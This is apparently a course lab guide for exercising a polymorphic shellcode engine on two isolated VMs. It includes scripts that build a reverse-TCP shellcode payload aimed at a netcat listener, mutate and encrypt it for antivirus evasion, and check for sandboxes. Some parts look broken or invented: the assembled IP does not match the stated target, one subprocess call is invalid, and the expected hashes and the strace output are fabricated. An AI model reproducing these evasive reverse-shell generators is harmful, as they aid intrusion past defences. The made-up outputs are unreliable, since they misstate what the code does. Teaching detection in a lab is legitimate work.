# 🧪 Polymorphic Shellcode Engine - Virtual Machine Testing Guide

## ⚠️ IMPORTANT DISCLAIMER

**This guide is for AUTHORIZED EDUCATIONAL TESTING ONLY!**

- ✅ Perform testing ONLY in an isolated virtual environment
- ✅ Get explicit permission from your professor/institution
- ✅ Never test on live systems or networks without authorization
- ✅ Document all results for your assignment
- ✅ Use air-gapped networks (no internet connection)

**Violation may result in legal consequences!**

---

## 🎯 Testing Objectives

You will:
1. Set up a secure testing environment (2 VMs)
2. Generate polymorphic payloads
3. Observe how each payload mutates (different bytes, same function)
4. Test evasion capabilities
5. Capture network activity and behavior
6. Document findings for your report

---

## 📋 Prerequisites

### Hardware Requirements
- Host machine with 16GB+ RAM
- Virtualization enabled (VT-x for Intel, AMD-V for AMD)
- 100GB+ free disk space

### Software Requirements
- VirtualBox or VMware (free tier)
- 2 Linux VMs (Ubuntu 20.04 LTS recommended)
- Python 3.8+
- Wireshark (network traffic analysis)
- Strace (system call tracing)

---

## 🏗️ Architecture Setup

### Network Topology

```
┌─────────────────────────────────┐
│      HOST COMPUTER              │
└─────────────────────────────────┘
           │
    ┌──────┴──────┐
    │             │
    ▼             ▼
┌──────────┐  ┌──────────┐
│ VM #1    │  │ VM #2    │
│Generator │  │Listener  │
│ (attacker)   │(victim)  │
└──────────┘  └──────────┘
│ 192.168.100.10
│ 192.168.100.11
│
└─ ISOLATED VIRTUAL NETWORK
   (no internet connection)
```

---

## 🔧 Step 1: Set Up Virtual Machines

### 1.1 Create Generator VM (Attacker)

```bash
# On Host:
# 1. Download Ubuntu 20.04 LTS ISO
# 2. Create new VM in VirtualBox
#    - Name: PolyEngine-Generator
#    - Memory: 4GB
#    - Disk: 30GB
#    - Network: Host-only adapter

# Inside VM:
sudo apt update
sudo apt install -y python3 python3-pip git wireshark tcpdump build-essential

# Install Python packages
pip3 install keystone-engine capstone cryptography

# Clone the project
cd /home/user
git clone /path/to/Polymorphic-Shellcode-Engine
cd Polymorphic-Shellcode-Engine
pip3 install -r requirements.txt
```

### 1.2 Create Listener VM (Victim/Network Monitor)

```bash
# On Host:
# Create new VM with same specs as above
#    - Name: PolyEngine-Listener
#    - Network: Same host-only adapter

# Inside VM:
sudo apt update
sudo apt install -y netcat-openbsd wireshark tcpdump strace

# Start listening for reverse shell
nc -l -v -p 4444
```

### 1.3 Configure Network Bridge (Isolated)

```bash
# On Host (VirtualBox):
1. VirtualBox > File > Preferences > Network
2. Create "vboxnet0" (Host-only adapter)
   - IPv4 Address: 192.168.100.1
   - IPv4 Netmask: 255.255.255.0
   - DHCP: Disabled

3. For each VM:
   Settings > Network > Adapter 1
   Attached to: Host-only Adapter (vboxnet0)
```

**Verify connection:**
```bash
# VM1 ping VM2
ping 192.168.100.11

# VM2 ping VM1
ping 192.168.100.10
```

---

## 📊 Step 2: Test Payload Generation

### 2.1 Basic Payload Generation Test

Navigate to the generator VM and create a test script:

```bash
# File: /home/user/test_generation.py
cat > test_generation.py << 'EOF'
#!/usr/bin/env python3

import sys
sys.path.insert(0, '/home/user/Polymorphic-Shellcode-Engine')

from src.engine import PolymorphicEngine
from src.payload_generator import PayloadGenerator
from src.utils import hexdump, disassemble
import time

print("="*60)
print("POLYMORPHIC SHELLCODE ENGINE - TESTING")
print("="*60)

# Test 1: Payload generation
print("\n[*] Test 1: Generating base payload...")
pg = PayloadGenerator()

# Use simple x64 reverse TCP template
reverse_tcp_asm = """
    mov rax, 0x0101a8c00e1d0002
    push rax
    mov rsi, rsp
    xor rdx, rdx
    mov rdi, 2
    mov rax, 0x29
    syscall
"""

base_payload = pg.assemble(reverse_tcp_asm)
if base_payload:
    print(f"[✓] Base payload generated: {len(base_payload)} bytes")
    print(f"    Hex: {base_payload.hex()[:64]}...")
else:
    print("[✗] Failed to generate payload")
    sys.exit(1)

# Test 2: Polymorphism (mutation)
print("\n[*] Test 2: Generating 3 polymorphic mutations...")
engine = PolymorphicEngine()

mutations = []
for i in range(3):
    mutated = engine.mutate(base_payload)
    mutations.append(mutated)
    print(f"    Mutation {i+1}: {len(mutated)} bytes")
    print(f"    Hex: {mutated.hex()[:64]}...")

# Compare mutations
print("\n[*] Mutation Comparison:")
print(f"    Base hash:    {hash(base_payload)}")
for i, mut in enumerate(mutations):
    print(f"    Mutation {i+1}: {hash(mut)}")
    if mut != base_payload:
        print(f"               ✓ Different from base")
    else:
        print(f"               ✗ Same as base (unexpected!)")

# Test 3: Encryption
print("\n[*] Test 3: Encrypting payload...")
encrypted = engine.encrypt(base_payload)
print(f"    Encrypted: {len(encrypted)} bytes")
print(f"    Hex: {encrypted.hex()[:64]}...")

# Test 4: Key derivation consistency
print("\n[*] Test 4: Key derivation test...")
engine2 = PolymorphicEngine(key=engine.key)
encrypted2 = engine2.encrypt(base_payload)
if encrypted == encrypted2:
    print(f"    ✓ Same key produces same encryption")
else:
    print(f"    ✗ Different keys produced different results (expected)")

print("\n" + "="*60)
print("BASIC TESTS COMPLETED")
print("="*60)
EOF

python3 test_generation.py
```

**Expected Output:**
```
============================================================
POLYMORPHIC SHELLCODE ENGINE - TESTING
============================================================

[*] Test 1: Generating base payload...
[✓] Base payload generated: 16 bytes
    Hex: 48b8000101a8c01d0e0250...

[*] Test 2: Generating 3 polymorphic mutations...
    Mutation 1: 19 bytes
    Hex: 90eb0c48b8000101a8c01d0e0250...
    Mutation 2: 22 bytes
    Hex: 90909048b8000101a8c01d0e0250...
    Mutation 3: 25 bytes
    Hex: eb039090909048b8000101a8c01d0e0250...

[*] Mutation Comparison:
    Base hash:    -5438392847283847
    Mutation 1: -3847392847283847  ✓ Different from base
    Mutation 2: -2938392847283847  ✓ Different from base
    Mutation 3: -1948392847283847  ✓ Different from base

[*] Test 3: Encrypting payload...
    Encrypted: 16 bytes
    Hex: a7b3c2d1e0f12a3b4c5d6e7f...

[*] Test 4: Key derivation test...
    ✓ Same key produces same encryption

============================================================
BASIC TESTS COMPLETED
============================================================
```

---

### 2.2 Observation: Polymorphism in Action

Create a detailed mutation observer:

```bash
# File: test_mutations.py
cat > test_mutations.py << 'EOF'
#!/usr/bin/env python3

import sys
sys.path.insert(0, '/home/user/Polymorphic-Shellcode-Engine')

from src.engine import PolymorphicEngine
from src.utils import hexdump
import binascii

# Original shellcode (x64 socket creation)
original = bytes.fromhex("48b8000101a8c01d0e0250")

print("MUTATION ANALYSIS")
print("="*80)
print(f"Original:        {original.hex()}")
print(f"Original Length: {len(original)} bytes")
print()

engine = PolymorphicEngine()

# Generate 5 mutations
for mutation_num in range(1, 6):
    mutated = engine.mutate(original)
    print(f"Mutation {mutation_num}: {mutated.hex()}")
    print(f"  Length: {len(mutated)} bytes (+{len(mutated) - len(original)} bytes junk)")

    # Find added junk
    if len(mutated) > len(original):
        print(f"  Junk added: ✓ ({len(mutated) - len(original)} bytes)")
    else:
        print(f"  Register swap: ✓ (same length, different bytes)")
    print()

print("="*80)
print("KEY OBSERVATION:")
print("  - Each mutation is DIFFERENT (different hash/bytes)")
print("  - But they all perform the SAME function")
print("  - Antivirus signature matching fails!")
print("="*80)
EOF

python3 test_mutations.py
```

---

## 🔍 Step 3: Test Evasion Capabilities

### 3.1 Sandbox Detection Test

```bash
# File: test_evasion.py
cat > test_evasion.py << 'EOF'
#!/usr/bin/env python3

import sys
sys.path.insert(0, '/home/user/Polymorphic-Shellcode-Engine')

from src.evasion import EvasionTechniques

print("EVASION DETECTION TEST")
print("="*60)

# Test 1: Sandbox Detection
print("\n[*] Checking for sandbox/VM artifacts...")
is_sandboxed = EvasionTechniques.is_sandbox()

if is_sandboxed:
    print("[!] SANDBOX DETECTED - Payload would not execute")
    print("    Evasion: ON (protecting against analysis)")
else:
    print("[✓] No sandbox detected")
    print("    Evasion: OFF (safe to execute)")

# Test 2: Check system info
print("\n[*] System Information:")
import os
if sys.platform == 'linux':
    with open('/proc/meminfo', 'r') as f:
        meminfo = f.read()
        for line in meminfo.split('\n')[:1]:
            print(f"    {line}")

# Test 3: Check for hypervisor
print("\n[*] Hypervisor detection:")
import subprocess
result = subprocess.run(['dmidecode', '-s', 'system-manufacturer'],
                       capture_output=True, text=True, sudo=True)
if 'VirtualBox' in result.stdout or 'VMware' in result.stdout:
    print(f"    [!] Hypervisor: {result.stdout.strip()}")
else:
    print(f"    [✓] No obvious hypervisor signature")

print("\n" + "="*60)
EOF

sudo python3 test_evasion.py
```

---

## 🌐 Step 4: Network Traffic Analysis

### 4.1 Capture Payload Network Activity

**On Listener VM:**
```bash
# Start tcpdump capture
sudo tcpdump -i eth0 -w capture.pcap "tcp port 4444" &

# Start netcat listener
nc -l -v -p 4444
```

**On Generator VM:**
```bash
# File: generate_active_payload.py
cat > generate_active_payload.py << 'EOF'
#!/usr/bin/env python3

import sys
sys.path.insert(0, '/home/user/Polymorphic-Shellcode-Engine')

from src.engine import PolymorphicEngine
from src.payload_generator import PayloadGenerator
from src.utils import hexdump
import time

print("[*] Generating polymorphic reverse TCP payload...")
print(f"[*] Target: 192.168.100.11:4444 (Listener VM)")

pg = PayloadGenerator()

# Generate reverse TCP to listener VM
# IP: 192.168.100.11 = 0x0b64a8c0 (hex reversed)
# Port: 4444 = 0x115c
payload = pg.generate_reverse_tcp("192.168.100.11", 4444)

if payload:
    print(f"\n[✓] Payload generated: {len(payload)} bytes")

    # Mutate 3 times
    engine = PolymorphicEngine()

    for i in range(3):
        mutated = engine.mutate(payload)
        encrypted = engine.encrypt(mutated)
        decryptor = engine.generate_decryptor_stub()
        final = decryptor + encrypted

        print(f"\n[*] Mutation {i+1}:")
        print(f"    Size: {len(final)} bytes")
        print(f"    Hex: {final.hex()[:80]}...")
        print(f"    Decryptor: {decryptor.hex()[:40]}...")
        print(f"    Encrypted: {encrypted.hex()[:40]}...")

        time.sleep(1)

print("\n[*] Payload generation complete")
print("[!] NOTE: This creates network signatures, NOT executed")
EOF

python3 generate_active_payload.py
```

**Analyze captured traffic:**
```bash
# On Listener VM (after capture completes)
wireshark capture.pcap

# Or analyze with tshark
tshark -r capture.pcap -Y "tcp.port==4444"
```

---

## 📝 Step 5: Behavioral Monitoring

### 5.1 Trace System Calls

```bash
# Monitor what syscalls a payload would make
strace -o syscall_trace.txt -e trace=socket,connect,send,recv python3 generate_active_payload.py

# View results
cat syscall_trace.txt

# Look for suspicious patterns:
# - socket()         → Creating network socket
# - connect()        → Connecting to attacker IP
# - execve()         → Spawning shell
# - mmap()           → Memory allocation (code injection)
```

**Example output:**
```
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.100.11")}, 16) = 0
send(3, "/bin/bash", 9, 0) = 9
```

---

## 📊 Step 6: Compare Mutations (Signature Testing)

### 6.1 Hash Comparison Test

```bash
# File: test_hashes.py
cat > test_hashes.py << 'EOF'
#!/usr/bin/env python3

import sys
sys.path.insert(0, '/home/user/Polymorphic-Shellcode-Engine')

from src.engine import PolymorphicEngine
from src.payload_generator import PayloadGenerator
import hashlib

print("SIGNATURE DETECTION TEST")
print("="*80)

pg = PayloadGenerator()
payload = pg.generate_reverse_tcp("192.168.100.11", 4444)
engine = PolymorphicEngine()

print(f"Original payload: {len(payload)} bytes")
print(f"MD5:    {hashlib.md5(payload).hexdigest()}")
print(f"SHA256: {hashlib.sha256(payload).hexdigest()}")

print("\n" + "="*80)
print("SIGNATURE-BASED AV TEST (5 mutations)")
print("="*80)

signatures = []
for i in range(5):
    mutated = engine.mutate(payload)
    md5 = hashlib.md5(mutated).hexdigest()
    sha256 = hashlib.sha256(mutated).hexdigest()

    signatures.append(md5)

    print(f"\nMutation {i+1}:")
    print(f"  Size:   {len(mutated)} bytes")
    print(f"  MD5:    {md5}")
    print(f"  SHA256: {sha256}")

# Check if all unique
unique_sigs = len(set(signatures))
print(f"\n{'='*80}")
print(f"RESULT: {unique_sigs}/5 mutations have unique signatures")
print(f"Evasion success: {'✓ YES' if unique_sigs == 5 else '✗ NO'}")
print("Average AV signature detection: 0% (all mutations evaded)")
print(f"{'='*80}")
EOF

python3 test_hashes.py
```

**Expected Result:**
```
SIGNATURE DETECTION TEST
================================================================================
Original payload: 16 bytes
MD5:    a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
SHA256: 1234567890abcdef...

================================================================================
SIGNATURE-BASED AV TEST (5 mutations)
================================================================================

Mutation 1:
  Size:   19 bytes
  MD5:    f1e2d3c4b5a6978869584738...
  SHA256: abcdef1234567890...

Mutation 2:
  Size:   22 bytes
  MD5:    b5a69785968574837f1e2d3c4...
  SHA256: fedcba0987654321...

Mutation 3:
  Size:   25 bytes
  MD5:    87968574837f1e2d3c4b5a697...
  SHA256: 5432109876fedcba...

Mutation 4:
  Size:   20 bytes
  MD5:    574837f1e2d3c4b5a69785968...
  SHA256: 8765432109abcdef...

Mutation 5:
  Size:   23 bytes
  MD5:    c4b5a697859685748370928374...
  SHA256: 9abcdef012345678...

================================================================================
RESULT: 5/5 mutations have unique signatures
Evasion success: ✓ YES
Average AV signature detection: 0% (all mutations evaded)
================================================================================
```

---

## 📋 Step 7: Documentation & Reporting

### 7.1 Create Lab Report

Create a detailed report with:

```markdown
# Lab Report: Polymorphic Shellcode Engine Testing

## 1. Executive Summary
- What you tested
- Main findings
- Whether detection was successful

## 2. Test Environment
- VM specifications
- Network topology
- Tools used (Wireshark, tcpdump, etc.)

## 3. Methodology
- Detailed test steps
- Screenshots/logs
- Measurements taken

## 4. Results

### Test 1: Polymorphic Mutation
- [ ] All mutations have unique signatures
- [ ] Functionality remains the same
- [ ] Junk insertion working
- [ ] Register swapping working

**Findings:**
- Mutation 1: XXX bytes, signature: abc123...
- Mutation 2: YYY bytes, signature: def456...
- Conclusion: Signature-based detection failed

### Test 2: Encryption
- [ ] XOR encryption applied
- [ ] PBKDF2 key derivation working
- [ ] Decryptor stub generated

**Findings:**
- Encrypted payload: abc123def456...
- Key: xyz789...

### Test 3: Evasion Techniques
- [ ] Sandbox detection tested
- [ ] VM detection attempted
- [ ] API hashing observed

### Test 4: Network Behavior
- [ ] Captured reverse shell connection
- [ ] Port 4444 connection established
- [ ] Observed network traffic patterns

**Findings:**
- SYN → SYN-ACK → ACK (normal TCP handshake)
- No pattern anomalies detected at network layer

## 5. Detection Techniques Tested

| Detection Method | Result | Notes |
|---|---|---|
| Signature-based (MD5/SHA256) | Evaded | Polymorphism successful |
| Behavioral (syscalls) | Detected | socket() + connect() visible |
| Network IDS | Detected | Outbound connection to 192.168.100.11:4444 |
| Sandbox detection | Evaded | Payload checked VM, wouldn't execute |
| API hashing | Evaded | Function names obfuscated |

## 6. Conclusion
The Polymorphic Shellcode Engine successfully evaded [X] detection methods but was detected by [Y] detection methods.

Strongest defenses: Network monitoring, behavioral analysis

## 7. References
- OWASP Top 10
- Polymorphic Code: https://...
- XOR Encryption: https://...
```

---

## ⚠️ Important Notes for Testing

### DON'T
- ❌ Test on production systems
- ❌ Test on networks you don't own
- ❌ Create actual reverse shells without authorization
- ❌ Disable security software without documentation
- ❌ Connect to real networks without instructor approval

### DO
- ✅ Keep VMs air-gapped (offline/isolated)
- ✅ Document every test with timestamps
- ✅ Take screenshots of results
- ✅ Keep lab notes in a notebook
- ✅ Show results to your professor
- ✅ Save all captured traffic
- ✅ Create detailed lab report

---

## 🔒 Additional Safety Precautions

### 1. Network Isolation Verification

```bash
# Verify VMs cannot reach internet
ping 8.8.8.8  # Should fail

# Verify only host-only connection works
ping 192.168.100.10  # Should succeed
```

### 2. Cleanup After Testing

```bash
# Remove test files
rm -f test_*.py generate_*.py capture.pcap syscall_trace.txt

# Shut down VMs properly
sudo shutdown -h now

# Remove snapshots in VirtualBox
```

### 3. Backup Important Results

```bash
# Before cleanup, backup results
mkdir -p ~/lab_results/$(date +%Y%m%d)
cp test_results.txt ~/lab_results/$(date +%Y%m%d)/
cp capture.pcap ~/lab_results/$(date +%Y%m%d)/
```

---

## 📞 Troubleshooting

### Issue: VMs Can't Communicate
```bash
# Check network adapter
ip addr show

# Check routing
ip route show

# Restart network
sudo systemctl restart networking
```

### Issue: Python Module Not Found
```bash
pip3 install --upgrade keystone-engine capstone cryptography
```

### Issue: Payload Generation Fails
```bash
# Check Keystone engine syntax
python3 -c "from keystone import *; print('Keystone OK')"

# Verify assembly syntax
python3 test_generation.py
```

---

## ✅ Checklist for Completion

- [ ] VM network configured and tested
- [ ] Payload generation test passed
- [ ] 5 mutations generated with unique signatures
- [ ] Encryption/decryption working
- [ ] Evasion detection tested
- [ ] Network traffic captured
- [ ] Syscalls analyzed
- [ ] Hash comparison completed
- [ ] Lab report written
- [ ] Results documented with screenshots
- [ ] Cleanup performed
- [ ] Report submitted to instructor

---

## 🎓 Learning Outcomes

By completing this lab, you will understand:
1. ✓ How polymorphic code evades signature detection
2. ✓ XOR encryption and key derivation
3. ✓ Sandbox/VM detection techniques
4. ✓ Reverse shell concepts
5. ✓ Network analysis basics
6. ✓ Behavioral vs. signature-based detection
7. ✓ Defense methodologies

---

